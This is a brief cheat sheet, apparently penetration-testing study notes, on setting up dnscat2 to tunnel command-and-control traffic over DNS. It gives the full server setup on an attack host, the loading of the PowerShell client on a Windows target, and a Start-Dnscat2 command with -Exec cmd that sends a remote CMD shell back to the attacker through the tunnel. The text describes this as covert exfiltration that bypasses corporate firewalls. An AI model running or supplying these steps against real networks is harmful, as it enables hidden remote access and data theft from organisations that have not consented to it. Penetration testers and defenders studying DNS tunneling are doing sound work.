**Overview:**
- Dnscat2 is a tunneling tool that uses the DNS protocol to send data between two hosts over an encrypted C2 channel, embedding traffic inside TXT records.
- In corporate Active Directory environments, the local DNS server handles internal resolution and routes external queries outward. Dnscat2 abuses this by sending data-carrying requests to an external server instead of legitimate DNS queries, enabling covert exfiltration that bypasses firewalls stripping HTTPS or sniffing traffic.
- The server runs on the attack host and provides a pre-shared secret. The client on the Windows target uses this secret to authenticate and encrypt the tunnel.
---
## Server Setup (Attack Host)

```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

Clone the repository and install Ruby dependencies.

```bash
sudo ruby dnscat2.rb --dns host=<lhost>,port=53,domain=<domain> --no-cache
```

Start the dnscat2 server. `host` attack host IP, `port` DNS port, `domain` target domain. `--no-cache` disables caching. The server outputs a pre-shared secret upon startup, required for client authentication.

---
## Client Setup (Windows Target)

```bash
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

Clone the PowerShell client on the attack host and transfer it to the Windows target.

```powershell
Import-Module .\dnscat2.ps1
```

Import the dnscat2 PowerShell module on the Windows target.

```powershell
Start-Dnscat2 -DNSserver <lhost> -Domain <domain> -PreSharedSecret <secret> -Exec cmd
```

Establish the tunnel back to the attack host. `-DNSserver` attack host IP, `-Domain` target domain, `-PreSharedSecret` secret from server output, `-Exec cmd` sends a CMD shell session through the tunnel.

```bash
dnscat2> window -i 1
```

Interact with the established session. `-i` specifies the session window index.